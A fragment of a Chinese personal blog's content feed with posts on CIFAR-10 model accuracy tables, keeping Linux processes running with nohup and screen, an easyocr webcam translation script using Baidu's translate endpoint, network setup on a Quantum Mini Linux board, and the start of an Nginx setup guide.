<td>82%</td>
</tr>
<tr>
<td>cat 准确度</td>
<td>76%</td>
<td>74%</td>
</tr>
<tr>
<td>deer 准确度</td>
<td>86%</td>
<td>85%</td>
</tr>
<tr>
<td>dog 准确度</td>
<td>82%</td>
<td>83%</td>
</tr>
<tr>
<td>frog 准确度</td>
<td>90%</td>
<td>91%</td>
</tr>
<tr>
<td>horse 准确度</td>
<td>88%</td>
<td>90%</td>
</tr>
<tr>
<td>ship 准确度</td>
<td>93%</td>
<td>92%</td>
</tr>
<tr>
<td>truck 准确度</td>
<td>94%</td>
<td>91%</td>
</tr>
</tbody>
</table>
</div>
<blockquote>
<p>扩充准确度 EPOCHS=100</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">VGG19 在10000张测试集图片上的准确率：88.840
正确率 ： plane : 91 %
正确率 ：   car : 96 %
正确率 ：  bird : 85 %
正确率 ：   cat : 78 %
正确率 ：  deer : 88 %
正确率 ：   dog : 79 %
正确率 ：  frog : 90 %
正确率 ： horse : 93 %
正确率 ：  ship : 94 %
正确率 ： truck : 90 %
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<div class="table-container">
<table>
<thead>
<tr>
<th>网络类型</th>
<th>VGG19</th>
<th>ResNet34 2</th>
</tr>
</thead>
<tbody>
<tr>
<td>准确度</td>
<td>88.84%</td>
<td>88.05%</td>
</tr>
<tr>
<td>loss</td>
<td>0.000</td>
<td>0.000</td>
</tr>
<tr>
<td>plane 准确度</td>
<td>91%</td>
<td>89%</td>
</tr>
<tr>
<td>car 准确度</td>
<td>96%</td>
<td>93%</td>
</tr>
<tr>
<td>bird 准确度</td>
<td>85%</td>
<td>82%</td>
</tr>
<tr>
<td>cat 准确度</td>
<td>78%</td>
<td>79%</td>
</tr>
<tr>
<td>deer 准确度</td>
<td>88%</td>
<td>85%</td>
</tr>
<tr>
<td>dog 准确度</td>
<td>79%</td>
<td>79%</td>
</tr>
<tr>
<td>frog 准确度</td>
<td>90%</td>
<td>91%</td>
</tr>
<tr>
<td>horse 准确度</td>
<td>93%</td>
<td>91%</td>
</tr>
<tr>
<td>ship 准确度</td>
<td>94%</td>
<td>93%</td>
</tr>
<tr>
<td>truck 准确度</td>
<td>90%</td>
<td>93%</td>
</tr>
</tbody>
</table>
</div>
<h2 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h2><p>以上结果可以看出<code>ResNet34 2&gt;VGG19&gt;VGG16&gt;ResNet34 1&gt;AlexNet&gt;LeNet</code></p>
]]></content>
      <categories>
        <category>pytorch</category>
      </categories>
      <tags>
        <tag>pytorch</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux进程断连重新进入该进程方法</title>
    <url>/2021/03/31/Linux%E8%BF%9B%E7%A8%8B%E6%96%AD%E8%BF%9E%E9%87%8D%E6%96%B0%E8%BF%9B%E5%85%A5%E8%AF%A5%E8%BF%9B%E7%A8%8B%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Linux进程断连后重新进入该进程"><a href="#Linux进程断连后重新进入该进程" class="headerlink" title="Linux进程断连后重新进入该进程"></a>Linux进程断连后重新进入该进程</h1><h2 id="Putty-or-Xshell"><a href="#Putty-or-Xshell" class="headerlink" title="Putty or Xshell"></a>Putty or Xshell</h2><p>首先推荐这两款软件附下载地址</p>
<ul>
<li><a href="https://www.baidu.com/s?ie=utf-8&amp;f=8&amp;rsv_bp=1&amp;rsv_idx=1&amp;tn=02003390_2_hao_pg&amp;wd=putty&amp;fenlei=256&amp;oq=linux%2520nohup%25E5%2590%258E%25E6%2580%258E%25E4%25B9%2588%25E8%25BF%259B%25E5%2585%25A5&amp;rsv_pq=a035ea760005dcd7&amp;rsv_t=2798tx2%2BkxpcNpvxPWiiy5OmKO49HU24tj7gyYA9ux%2FeHi83slME5HXfMhUJ6bBi6f1MApmcD6w&amp;rqlang=cn&amp;rsv_enter=1&amp;rsv_dl=tb&amp;rsv_btype=t&amp;inputT=1242&amp;rsv_sug3=66&amp;rsv_sug1=62&amp;rsv_sug7=100&amp;rsv_sug2=0&amp;rsv_sug4=2217">putty</a></li>
<li><a href="https://www.baidu.com/s?ie=utf-8&amp;f=8&amp;rsv_bp=1&amp;rsv_idx=1&amp;tn=02003390_2_hao_pg&amp;wd=Xshell&amp;fenlei=256&amp;oq=putty&amp;rsv_pq=b0799f87000715fa&amp;rsv_t=f14bcCxih9eDCmSbfD4GsjdA4Ze6qJeGljF5NTRMBryZiLfHD1G7o8s694yHumKPIvB8FLKiS6U&amp;rqlang=cn&amp;rsv_enter=1&amp;rsv_dl=tb&amp;rsv_btype=t&amp;inputT=1642&amp;rsv_sug3=74&amp;rsv_sug1=72&amp;rsv_sug7=100&amp;rsv_sug2=0&amp;rsv_sug4=2664">Xshell</a><h3 id="设置putty字体和全屏显示连接linux"><a href="#设置putty字体和全屏显示连接linux" class="headerlink" title="设置putty字体和全屏显示连接linux"></a>设置putty字体和全屏显示连接linux</h3><img src="https://img-blog.csdnimg.cn/20210331101315844.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA4Njcz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210331101324638.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA4Njcz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210331101359368.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA4Njcz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>设置成功后就可以进入远程linux系统了。</li>
</ul>
<h3 id="进入全屏"><a href="#进入全屏" class="headerlink" title="进入全屏"></a>进入全屏</h3><p>全屏：<kbd>Alt</kbd> + <kbd>Enter</kbd><br><img src="https://img-blog.csdnimg.cn/20210331101530527.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA4Njcz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h2 id="linux进程"><a href="#linux进程" class="headerlink" title="linux进程"></a>linux进程</h2><p>直接输入python main.py即可调度进行，但是在断开连接后，该进程就会被消除，这很让人头疼。</p>
<h3 id="后台执行"><a href="#后台执行" class="headerlink" title="后台执行"></a>后台执行</h3><p>一般运行linux上的程序都是执行 .sh 文件（./sh文件），那如果不影响当前CMD窗口的操作，需要后台运行怎么办呢？</p>
<p>这时就需要借助 nohup 和 &amp; 命令来实现。</p>
<p><code>nohup python3 main.py &amp;</code></p>
<ol>
<li>nohup </li>
</ol>
<p>加在一个命令的最前面，表示不挂断的运行命令</p>
<ol>
<li>&amp;</li>
</ol>
<p>加载一个命令的最后面，表示这个命令放在后台执行</p>
<h3 id="查看后台运行的命令"><a href="#查看后台运行的命令" class="headerlink" title="查看后台运行的命令"></a>查看后台运行的命令</h3><p>有两个命令可以来查看，ps 和 jobs。区别在于 jobs 只能查看当前终端后台执行的任务，换了终端就看不见了。而ps命令适用于查看瞬时进程的动态，可以看到别的终端的任务。</p>
<ol>
<li>jobs 查看后台运行的命令</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">dogandcat$ jobs
[1]+  Running                 nohup python3 pridict.py &amp;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<ol>
<li><p>ps查看进程</p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;dogandcat$ ps
  PID TTY          TIME CMD
20712 pts&#x2F;6    00:00:00 bash
20793 pts&#x2F;6    02:49:24 python3
22397 pts&#x2F;6    00:00:00 ps<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li><p>kill </p>
</li>
</ol>
<p>（1）通过jobs命令查看jobnum，然后执行   kill %jobnum</p>
<p>（2）通过ps命令查看进程号PID，然后执行  kill %PID</p>
<p>如果是前台进程的话，直接执行 Ctrl+c 就可以终止了</p>
<h3 id="前后台进程的切换与控制"><a href="#前后台进程的切换与控制" class="headerlink" title="前后台进程的切换与控制"></a>前后台进程的切换与控制</h3><p>（1）fg命令</p>
<p>将后台中的命令调至前台继续运行</p>
<p>如果后台中有多个命令，可以先用jobs查看jobnun，然后用 fg %jobnum 将选中的命令调出。</p>
<p>（2）Ctrl + z 命令</p>
<p>将一个正在前台执行的命令放到后台，并且处于暂停状态</p>
<p>（3）bg命令</p>
<p>将一个在后台暂停的命令，变成在后台继续执行</p>
<p>如果后台中有多个命令，可以先用jobs查看jobnum，然后用 bg %jobnum 将选中的命令调出继续执行。</p>
<h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><ul>
<li>首先后台运行一个进程：</li>
</ul>
<p><img src="https://img-blog.csdnimg.cn/20210331102625662.png" alt="在这里插入图片描述"></p>
<ul>
<li>用jobs找到进程号<br><img src="https://img-blog.csdnimg.cn/20210331102723639.png" alt="在这里插入图片描述"></li>
<li>fg %1 回到进程<br><img src="https://img-blog.csdnimg.cn/20210331102915834.png" alt="在这里插入图片描述"><br>退出：<kbd>Ctrl</kbd> + <kbd>Z</kbd></li>
</ul>
<p>-bg %1 继续执行进程<br><img src="https://img-blog.csdnimg.cn/20210331103034174.png" alt="在这里插入图片描述"></p>
<h3 id="尝试断开连接后jobs无法找到进程号"><a href="#尝试断开连接后jobs无法找到进程号" class="headerlink" title="尝试断开连接后jobs无法找到进程号"></a>尝试断开连接后jobs无法找到进程号</h3><h2 id="第二次尝试采用GUN-Screen"><a href="#第二次尝试采用GUN-Screen" class="headerlink" title="第二次尝试采用GUN Screen"></a>第二次尝试采用GUN Screen</h2><h3 id="Screen-Python3-main-py"><a href="#Screen-Python3-main-py" class="headerlink" title="Screen Python3 main.py"></a>Screen Python3 main.py</h3><p>创建一个窗口运行python 运行文件<br><img src="https://img-blog.csdnimg.cn/20210331112321190.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA4Njcz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h3 id="Screen-ls"><a href="#Screen-ls" class="headerlink" title="Screen -ls"></a>Screen -ls</h3><p><img src="https://img-blog.csdnimg.cn/20210331112220692.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA4Njcz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>找到屏幕号</p>
<h3 id="screen-r-27884"><a href="#screen-r-27884" class="headerlink" title="screen -r 27884"></a>screen -r 27884</h3><p>进入屏幕号</p>
<p>linux远程断联后重新进入该进程</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://blog.csdn.net/john_hongming/article/details/17219871">linux 关闭远程回话之后保持进程继续
</a></li>
</ul>
]]></content>
      <categories>
        <category>研究生课程</category>
      </categories>
      <tags>
        <tag>研究生课程</tag>
      </tags>
  </entry>
  <entry>
    <title>OCR_实时翻译</title>
    <url>/2021/10/27/OCR-%E5%AE%9E%E6%97%B6%E7%BF%BB%E8%AF%91/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="OCR-实时翻译"><a href="#OCR-实时翻译" class="headerlink" title="OCR_实时翻译"></a>OCR_实时翻译</h1><ul>
<li>采用了easyocr</li>
<li>爬虫，调取百度翻译接口</li>
</ul>
<h2 id="调用屏幕接口"><a href="#调用屏幕接口" class="headerlink" title="调用屏幕接口"></a>调用屏幕接口</h2><p>调用屏幕的方法很简单：<br><pre class="line-numbers language-none"><code class="language-none">import pyautogui
import cv2
import numpy as np
img &#x3D; pyautogui.screenshot(region&#x3D;[0, 0, 1920, 100])  # x,y,w,h
# img.save(&#39;screenshot.png&#39;)
img &#x3D; cv2.cvtColor(np.asarray(img), cv2.COLOR_RGB2BGR)
cv2.imshow(&quot;1&quot;,img)
cv2.waitKey(0)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>但感觉效率很低，最后改成了虚拟摄像头+cap=cv2.VideoCapture(1)的方式捕获。</p>
<h2 id="调用百度翻译接口"><a href="#调用百度翻译接口" class="headerlink" title="调用百度翻译接口"></a>调用百度翻译接口</h2><pre class="line-numbers language-none"><code class="language-none">import urllib.request
import urllib.parse
import json
import pyautogui
import cv2
import numpy as np
url &#x3D; &#39;https:&#x2F;&#x2F;fanyi.baidu.com&#x2F;sug&#39;
headers &#x3D; &#123;
    &#39;User-Agent&#39;: &#39;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;92.0.4515.159 Safari&#x2F;537.36&#39;
&#125;
data &#x3D; urllib.parse.urlencode(data).encode(&#39;utf-8&#39;)
request &#x3D; urllib.request.Request(url&#x3D;url, data&#x3D;data, headers&#x3D;headers)
response &#x3D; urllib.request.urlopen(request)
content &#x3D; response.read().decode(&#39;utf-8&#39;)
obj &#x3D; json.loads(content)
print(obj)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这个只能做单词翻译，还需要进一步优化。</p>
<h2 id="easyocr"><a href="#easyocr" class="headerlink" title="easyocr"></a>easyocr</h2><p>这个参考<a href="https://www.codekp.cn/2021/10/25/EasyOCR%E5%85%89%E5%AD%A6%E5%AD%97%E7%AC%A6%E8%AF%86%E5%88%AB/">EasyOCR光学字符识别</a></p>
<h2 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h2><blockquote>
<p>最终实现效果，在摄像头上和屏幕截取上都进行了测试.</p>
</blockquote>
<h3 id="首先是摄像头"><a href="#首先是摄像头" class="headerlink" title="首先是摄像头"></a>首先是摄像头</h3><p><img src="https://www.codekp.cn/download/img/baidu/baidu2.png" alt=""></p>
<h3 id="然后是屏幕"><a href="#然后是屏幕" class="headerlink" title="然后是屏幕"></a>然后是屏幕</h3><p><img src="https://www.codekp.cn/download/img/baidu/baidu1.png" alt=""></p>
<h2 id="最后是源码"><a href="#最后是源码" class="headerlink" title="最后是源码"></a>最后是源码</h2><pre class="line-numbers language-none"><code class="language-none">import time

import easyocr
import ssl
import cv2
# from matplotlib import pyplot as plt

import cv2
import numpy as np
from PIL import Image, ImageDraw, ImageFont
import urllib.request
import urllib.parse
import json
import pyautogui
import cv2
import numpy as np


ssl._create_default_https_context &#x3D; ssl._create_unverified_context
# 设置识别中英文两种语言
reader &#x3D; easyocr.Reader([&#39;ch_sim&#39;, &#39;en&#39;])  # need to run only once to load model into memory
Image3&#x3D;&#39;https:&#x2F;&#x2F;www.codekp.cn&#x2F;download&#x2F;img&#x2F;ubuntu&#x2F;NVIDIA1.png&#39;
Image2&#x3D;r&quot;H:\blog\wan_lab\blog_2020\source\download\img\ubuntu\NVIDIA1.png&quot;
Image4&#x3D;&quot;1.jpg&quot;
url &#x3D; &#39;https:&#x2F;&#x2F;fanyi.baidu.com&#x2F;sug&#39;
headers &#x3D; &#123;
    &#39;User-Agent&#39;: &#39;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;92.0.4515.159 Safari&#x2F;537.36&#39;
&#125;


cap&#x3D;cv2.VideoCapture(0)


while True:
    ret,img&#x3D;cap.read()
    # img &#x3D; pyautogui.screenshot(region&#x3D;[0, 0, 500, 500])  # x,y,w,h
    # img &#x3D; cv2.cvtColor(np.asarray(img), cv2.COLOR_RGB2BGR)
    cv2.imwrite(&quot;1.jpg&quot;,img)
    result &#x3D; reader.readtext(Image4, paragraph&#x3D;&quot;False&quot;)

    start&#x3D;time.time()
    for detection in result:
        top_left &#x3D; tuple(detection[0][0])
        bottom_right &#x3D; tuple(detection[0][2])
        text &#x3D; detection[1]
        img &#x3D; cv2.rectangle(img, top_left, bottom_right, (0, 255, 0), 3)
        img &#x3D; cv2ImgAddText(img, text, bottom_right[0], bottom_right[1], (0, 255, 0), 18)
        data &#x3D; &#123;
            &#39;kw&#39;: text
        &#125;
        data &#x3D; urllib.parse.urlencode(data).encode(&#39;utf-8&#39;)
        request &#x3D; urllib.request.Request(url&#x3D;url, data&#x3D;data, headers&#x3D;headers)
        response &#x3D; urllib.request.urlopen(request)
        content &#x3D; response.read().decode(&#39;utf-8&#39;)
        obj &#x3D; json.loads(content)
        print(obj)
        try:
            text2 &#x3D; str(obj[&#39;data&#39;][0][&#39;v&#39;])
            img &#x3D; cv2ImgAddText(img, text2, bottom_right[0], bottom_right[1]+20, (0, 255, 0), 18)
        except:
            pass
    cv2.imshow(&quot;1&quot;,img)
    cv2.waitKey(1)
    print((time.time()-start)*1000)
capture.release()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><pre><code>将百度翻译的内容，和原始图像显示出来并列到一起就有了一个比较完整的东西。
</code></pre><p><img src="https://www.codekp.cn/download/img/baidu/baidu3.png" alt=""></p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>OCR</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Quantum-Mini-Linux—配置</title>
    <url>/2021/04/13/Quantum-Mini-Linux%E2%80%94%E9%85%8D%E7%BD%AE/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><span id="more"></span>
<h1 id="Quantum-Mini-Linux—网络配置"><a href="#Quantum-Mini-Linux—网络配置" class="headerlink" title="Quantum-Mini-Linux—网络配置"></a><center>Quantum-Mini-Linux—网络配置</center></h1><p><img src="https://files.seeedstudio.com/wiki/Quantum-Mini-Linux-Dev-Kit/Quantum-Mini-Linux-Dev-Kit.png" alt=""></p>
<h2 id="wifi账号密码设置"><a href="#wifi账号密码设置" class="headerlink" title="wifi账号密码设置"></a>wifi账号密码设置</h2><p><code>sudo vi /etc/wpa_supplicant/wpa_supplicant.conf</code></p>
<p>修改如下的文件中的部分数据。</p>
<pre class="line-numbers language-none"><code class="language-none">network&#x3D;&#123;

               ssid&#x3D;&quot;[你的网络名称]&quot;

               psk&#x3D;&quot;[你的网络密码]&quot;



        &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>如图<img src="https://exp-picture.cdn.bcebos.com/a44e8afc508c9bcec61993c2d6dd884ce44afa75.jpg?x-bce-process=image%2Fresize%2Cm_lfit%2Cw_500%2Climit_1%2Fformat%2Cf_jpg%2Fquality%2Cq_80" alt=""></p>
<h2 id="对本地网络地址进行配置"><a href="#对本地网络地址进行配置" class="headerlink" title="对本地网络地址进行配置"></a>对本地网络地址进行配置</h2><p>由于在实验室，所用的路由器的端口号是10.xxx.xxx.xxx 然后直接ip连接到了该位置，这肯定有问题。</p>
<pre class="line-numbers language-none"><code class="language-none">sudo nano &#x2F;etc&#x2F;network&#x2F;interfaces<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>修改以下内容设置默认网关，具体数值可以根据自身情况修改</p>
<pre class="line-numbers language-none"><code class="language-none">auto lo
iface lo inet loopback
auto enxb827bb3ef8a  &#x2F;&#x2F;就是前面查看的名字
iface enxb827bb3ef8a inet static
address 192.168.1.2    &#x2F;&#x2F;IP地址
netmask 255.255.255.0    &#x2F;&#x2F;掩码
gateway 192.168.1.1     &#x2F;&#x2F;网关<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="查看是否连接成功"><a href="#查看是否连接成功" class="headerlink" title="查看是否连接成功"></a>查看是否连接成功</h2><p>ping 192.168.1.2可以但是无法ping www.baidu.com</p>
<p>报错，unknown host www.baidu.com</p>
<h2 id="设置端口"><a href="#设置端口" class="headerlink" title="设置端口"></a>设置端口</h2><pre class="line-numbers language-none"><code class="language-none">sudo vi &#x2F;etc&#x2F;resolv.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>如果你们网络不行的话，那么一定是这个nameserver的问题。</p>
<p>所以，修改</p>
<p>直接在那里面修改。</p>
<p>改成8.8.8.8</p>
<p>:wq保存就可以了。</p>
<p>但是尝试后发现不是因为dns域名解析的问题。</p>
<h2 id="windows找到www-baidu-com的ip地址"><a href="#windows找到www-baidu-com的ip地址" class="headerlink" title="windows找到www.baidu.com的ip地址"></a>windows找到www.baidu.com的ip地址</h2><pre class="line-numbers language-none"><code class="language-none">win+R

cmd

ping www.baidu.com
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>百度的地址为14.215.177.39</p>
<p>用linux ping该地址，发现还是无法连接，证明linux没有连接到外网。</p>
<h2 id="linux增加路由"><a href="#linux增加路由" class="headerlink" title="linux增加路由"></a>linux增加路由</h2><p>由于linux无法ping通外网，搜索后发现</p>
<p>route</p>
<p>查看路由表，很神奇的是路由表是空的，于是在思考后。</p>
<p>route add default gw 192.168.1.1</p>
<p>route</p>
<p>成功解决树莓派无法上网问题。</p>
<p>shutdown -r now</p>
<h2 id="通过putty可以从局域网ssh访问Quantum-linux"><a href="#通过putty可以从局域网ssh访问Quantum-linux" class="headerlink" title="通过putty可以从局域网ssh访问Quantum-linux"></a>通过putty可以从局域网ssh访问Quantum-linux</h2><ul>
<li><a href="https://www.baidu.com/s?ie=utf-8&amp;f=8&amp;rsv_bp=1&amp;rsv_idx=1&amp;tn=02003390_2_hao_pg&amp;wd=putty&amp;fenlei=256&amp;oq=linux%2520nohup%25E5%2590%258E%25E6%2580%258E%25E4%25B9%2588%25E8%25BF%259B%25E5%2585%25A5&amp;rsv_pq=a035ea760005dcd7&amp;rsv_t=2798tx2%2BkxpcNpvxPWiiy5OmKO49HU24tj7gyYA9ux%2FeHi83slME5HXfMhUJ6bBi6f1MApmcD6w&amp;rqlang=cn&amp;rsv_enter=1&amp;rsv_dl=tb&amp;rsv_btype=t&amp;inputT=1242&amp;rsv_sug3=66&amp;rsv_sug1=62&amp;rsv_sug7=100&amp;rsv_sug2=0&amp;rsv_sug4=2217">putty</a></li>
<li><a href="https://www.baidu.com/s?ie=utf-8&amp;f=8&amp;rsv_bp=1&amp;rsv_idx=1&amp;tn=02003390_2_hao_pg&amp;wd=Xshell&amp;fenlei=256&amp;oq=putty&amp;rsv_pq=b0799f87000715fa&amp;rsv_t=f14bcCxih9eDCmSbfD4GsjdA4Ze6qJeGljF5NTRMBryZiLfHD1G7o8s694yHumKPIvB8FLKiS6U&amp;rqlang=cn&amp;rsv_enter=1&amp;rsv_dl=tb&amp;rsv_btype=t&amp;inputT=1642&amp;rsv_sug3=74&amp;rsv_sug1=72&amp;rsv_sug7=100&amp;rsv_sug2=0&amp;rsv_sug4=2664">Xshell</a><h3 id="设置putty字体和全屏显示连接linux"><a href="#设置putty字体和全屏显示连接linux" class="headerlink" title="设置putty字体和全屏显示连接linux"></a>设置putty字体和全屏显示连接linux</h3><img src="https://img-blog.csdnimg.cn/20210331101315844.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA4Njcz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210331101324638.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA4Njcz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210331101359368.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA4Njcz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>设置成功后就可以进入远程linux系统了。</li>
</ul>
<h3 id="进入全屏"><a href="#进入全屏" class="headerlink" title="进入全屏"></a>进入全屏</h3><p>全屏：<kbd>Alt</kbd> + <kbd>Enter</kbd><br><img src="https://img-blog.csdnimg.cn/20210331101530527.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxNTA4Njcz,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
]]></content>
      <categories>
        <category>微型计算机</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Quantum_linux_服务器_内网穿透_v*n</title>
    <url>/2021/04/13/Quantum-linux-%E6%9C%8D%E5%8A%A1%E5%99%A8-%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F-v-n/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="树莓派服务器-内网穿透-v-n"><a href="#树莓派服务器-内网穿透-v-n" class="headerlink" title="树莓派服务器_内网穿透_v*n"></a>树莓派服务器_内网穿透_v*n</h1><h2 id="安装Nginx"><a href="#安装Nginx" class="headerlink" title="安装Nginx"></a>安装Nginx</h2><pre class="line-numbers language-none"><code class="language-none">sudo apt-get install nginx
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>安装失败，解决方法：</p>
<ol>
<li><p>修复网络连接，详情请见<a href="">树莓派网络连接dns配置</a></p>
</li>
<li><p>更新apt-get</p>
</li>
</ol>
<pre class="line-numbers language-none"><code class="language-none">sudo apt-get update
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>启动 nginx<br><pre class="line-numbers language-none"><code class="language-none">sudo &#x2F;etc&#x2F;init.d&#x2F;nginx start
<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>显示如下所示即为正常。</p>
<blockquote>
<p>[ ok ] Starting nginx (via systemctl): nginx.service.</p>
</blockquote>
<p>可以用浏览器登录树莓派ip地址查看是否成功。</p>
<h2 id="修改Nginx"><a href="#修改Nginx" class="headerlink" title="修改Nginx"></a>修改Nginx</h2><pre class="line-numbers language-none"><code class="language-none">sudo vi &#x2F;etc&#x2F;nginx&#x2F;sites-available&#x2F;default<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>对于default进行修改</p>
<pre class="line-numbers language-none"><code class="language-none">leafpad &#x2F;etc&#x2F;nginx&#x2F;sites-available&#x2F;default #修改配置文件：


server &#123;
	listen   80; ## 改监听端口号
	root xxx; ##默认网页的根目录位置
	index index.html index.htm;

	# Make site accessible from http:&#x2F;&#x2F;localhost&#x2F;
	server_name localhost;

	location &#x2F; &#123;
		# First attempt to serve request as file, then
		# as directory, then fall back to displaying a 404.
		  try_files $uri $uri&#x2F; &#x2F;index.html;
		# Uncomment to enable naxsi on this location
		# include &#x2F;etc&#x2F;nginx&#x2F;naxsi.rules
	&#125;
&#125;
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>创建网页根目录地址：xxx</p>
<p>cd 进入以后输入 sudo vi index.html</p>
<pre class="line-numbers language-none"><code class="language-none">

&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;title&gt;树莓派.md&lt;&#x2F;title&gt;
&lt;meta http-equiv&#x3D;&quot;Content-type&quot; content&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot;&gt;

&lt;style&gt;
&#x2F;* https:&#x2F;&#x2F;github.com&#x2F;microsoft&#x2F;vscode&#x2F;blob&#x2F;master&#x2F;extensions&#x2F;markdown-language-features&#x2F;media&#x2F;markdown.css *&#x2F;
&#x2F;*---------------------------------------------------------------------------------------------
 *  Copyright (c) Microsoft Corporation. All rights reserved.
 *  Licensed under the MIT License. See License.txt in the project root for license information.
 *--------------------------------------------------------------------------------------------*&#x2F;

body &#123;
